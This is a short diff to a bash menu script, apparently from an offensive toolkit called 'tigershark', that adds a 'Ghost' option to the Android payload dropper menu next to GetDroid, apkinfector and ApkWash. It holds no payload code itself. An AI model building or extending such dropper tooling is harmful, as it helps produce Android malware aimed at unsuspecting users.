@@ -215,7 +215,7 @@ dropper_mods(){
 droid(){
     echo -e "${RED}"
         PS3='How would you like to compile your android payload?'
-            options=("GetDroid" "apkinfector" "ApkWash" "Back")
+            options=("GetDroid" "apkinfector" "ApkWash" "Ghost" "Back")
             select opt in "${options[@]}"
             do
                 case $opt in
@@ -231,6 +231,10 @@ droid(){
                         ./Modules/Droppers/droid/apkwash.sh
                         ;;
                         
+                    "Ghost")
+                        ./Modules/Droppers/droid/ghost.sh
+                        ;;
+
                     "Back")
                         ./tigershark
                         ;;
